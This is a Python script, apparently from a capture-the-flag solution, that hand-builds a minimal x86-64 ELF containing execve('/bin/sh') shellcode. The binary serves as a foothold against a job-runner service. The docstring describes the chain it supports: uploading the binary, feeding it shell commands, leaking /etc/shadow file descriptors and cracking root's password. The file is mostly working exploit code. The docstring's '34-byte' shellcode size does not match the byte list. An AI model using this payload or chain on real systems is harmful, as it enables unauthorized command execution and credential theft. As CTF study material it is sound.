"""Build a minimal static ``execve("/bin/sh")`` ELF for the СотоLambda job runner.

СотоLambda's ``sandbox_worker.elf`` authenticates a job against real OS accounts
(``/etc/shadow`` + ``crypt()``) and then does a raw ``fork()`` + priv-drop +
``execv(binary, argv)`` on whatever ELF you uploaded -- no seccomp, no namespaces,
no chroot. That means the *only* thing you need to run arbitrary shell commands as
a given Unix account is a tiny, dependency-free ELF that hands control to
``/bin/sh`` and reads its commands from stdin (which the worker feeds via the
job's ``stdin`` field).

This script hand-assembles that ELF directly (no compiler needed): a 34-byte
x86-64 shellcode does ``execve("/bin/sh", ["/bin/sh", NULL], NULL)``, wrapped in
a minimal 64-byte ELF header + one 56-byte ``PT_LOAD`` program header. The
resulting 159-byte ``shell.elf`` is the foothold binary used throughout the
exploit chain: uploaded once via ``POST /api/upload``, then invoked repeatedly
via ``POST /api/invoke`` with attacker-chosen ``stdin`` to (a) spray
timeout-triggered ``/etc/shadow`` fd leaks, (b) read the leaked fds back out via
a perl one-liner, and finally (c) run as ``root`` once its cracked password is
known. See ``sotolambda_writeup.md`` §5 for the full chain and
``AUTHROOT_NOTES.md`` for the exact HTTP payloads.
"""

import struct

# execve("/bin/sh", {"/bin/sh", NULL}, NULL) followed by exit(0); the child
# reads shell commands from its inherited stdin, which is how the CTF worker's
# job "stdin" field turns into arbitrary command execution.
SHELLCODE = bytes(
    [
        0x48, 0x31, 0xD2,  # xor rdx, rdx
        0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00,  # mov rbx, "/bin/sh\0"
        0x53,  # push rbx
        0x48, 0x89, 0xE7,  # mov rdi, rsp        (path)
        0x52,  # push rdx            (NULL)
        0x57,  # push rdi
        0x48, 0x89, 0xE6,  # mov rsi, rsp        (argv = ["/bin/sh", NULL])
        0x48, 0x31, 0xC0, 0xB0, 0x3B,  # xor rax, rax; mov al, 59  (execve)
        0x0F, 0x05,  # syscall
        0x48, 0x31, 0xFF, 0x48, 0x31, 0xC0, 0xB0, 0x3C, 0x0F, 0x05,  # exit(0)
    ]
)  # fmt: skip

BASE = 0x400000
EHSIZE = 64
PHSIZE = 56


def build_elf(shellcode: bytes) -> bytes:
    """Wrap ``shellcode`` in a minimal ELF64 executable with one PT_LOAD segment."""
    entry = BASE + EHSIZE + PHSIZE
    header = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    header += struct.pack(
        "<HHIQQQIHHHHHH",
        2,  # e_type = ET_EXEC
        0x3E,  # e_machine = EM_X86_64
        1,  # e_version
        entry,  # e_entry
        EHSIZE,  # e_phoff (program header follows the ELF header)
        0,  # e_shoff (no section headers)
        0,  # e_flags
        EHSIZE,  # e_ehsize
        PHSIZE,  # e_phentsize
        1,  # e_phnum
        0,  # e_shentsize
        0,  # e_shnum
        0,  # e_shstrndx
    )
    total_size = EHSIZE + PHSIZE + len(shellcode)
    program_header = struct.pack(
        "<IIQQQQQQ",
        1,  # p_type = PT_LOAD
        5,  # p_flags = R+X
        0,  # p_offset
        BASE,  # p_vaddr
        BASE,  # p_paddr
        total_size,  # p_filesz
        total_size,  # p_memsz
        0x1000,  # p_align
    )
    return header + program_header + shellcode


def main() -> None:
    """Write ``shell.elf`` to the current directory."""
    elf = build_elf(SHELLCODE)
    with open("shell.elf", "wb") as f:
        f.write(elf)
    print(f"wrote shell.elf ({len(elf)} bytes)")


if __name__ == "__main__":
    main()
